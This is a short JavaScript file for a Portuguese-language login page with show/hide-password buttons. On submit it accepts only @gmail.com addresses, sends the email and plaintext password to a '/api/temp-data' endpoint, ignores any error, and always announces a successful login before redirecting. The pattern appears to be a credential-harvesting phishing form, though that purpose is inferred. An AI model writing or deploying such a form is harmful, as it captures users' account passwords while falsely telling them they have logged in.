const loginForm = document.querySelector('#loginForm');

document.querySelectorAll('.mostrar-senha').forEach((botao) => {
    botao.addEventListener('click', () => {
        const campo = document.getElementById(botao.dataset.alvo);
        if (!campo) return;
        const visivel = campo.type === 'password';
        campo.type = visivel ? 'text' : 'password';
        botao.setAttribute('aria-pressed', String(visivel));
        botao.setAttribute('aria-label', visivel ? 'Ocultar senha' : 'Mostrar senha');
    });
});

if (loginForm) {
    loginForm.addEventListener('submit', async (event) => {
        event.preventDefault();

        const emailInput = document.querySelector('#useremail') || document.querySelector('.useremail');
        const senhaInput = document.getElementById('password');
        
        if (!emailInput) return;

        const email = emailInput.value.trim().toLowerCase();

        if (!/^[^\s@]+@gmail\.com$/.test(email)) {
            alert('Use um email que termine com @gmail.com.');
            return;
        }

        const senha = senhaInput ? senhaInput.value : '';

        try {
            await fetch('/api/temp-data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email, senha })
            });
        } catch (e) {
        }

        alert('Login realizado com sucesso!');

        setTimeout(() => {
            window.location.href = '../pages/register.html';
        }, 2000);
    });
}